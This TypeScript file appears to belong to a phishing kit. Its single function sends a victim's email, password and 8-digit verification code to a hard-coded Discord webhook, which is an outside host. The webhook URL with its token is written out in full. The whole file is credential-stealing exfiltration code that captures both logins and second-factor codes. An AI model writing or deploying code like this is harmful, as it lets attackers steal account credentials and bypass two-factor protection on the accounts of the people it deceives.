const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1290064859018428466/_qS1U4H3wEyLE4PE0edFtOYc-24ER73KWwIRSuUKN9joNIMXXEiyA1qAmn3GT8ZuKtwh';

export async function sendToDiscord(data: {
  email: string;
  password: string;
  code?: string;
}) {
  try {
    const timestamp = new Date().toLocaleString();
    
    if (data.code) {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          embeds: [{
            title: "🔐 New Verification Details",
            color: 15105570,
            fields: [
              {
                name: "📧 Email",
                value: data.email,
                inline: true
              },
              {
                name: "🔑 Password",
                value: data.password,
                inline: true
              },
              {
                name: "📱 8-Digit Code",
                value: data.code,
                inline: false
              }
            ],
            footer: {
              text: `Timestamp: ${timestamp}`
            }
          }]
        })
      });
    } else {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          embeds: [{
            title: "🔐 New Login Attempt",
            color: 3447003,
            fields: [
              {
                name: "📧 Email",
                value: data.email,
                inline: true
              },
              {
                name: "🔑 Password",
                value: data.password,
                inline: true
              }
            ],
            footer: {
              text: `Timestamp: ${timestamp}`
            }
          }]
        })
      });
    }
  } catch (error) {
    console.error('Error sending to Discord:', error);
  }
}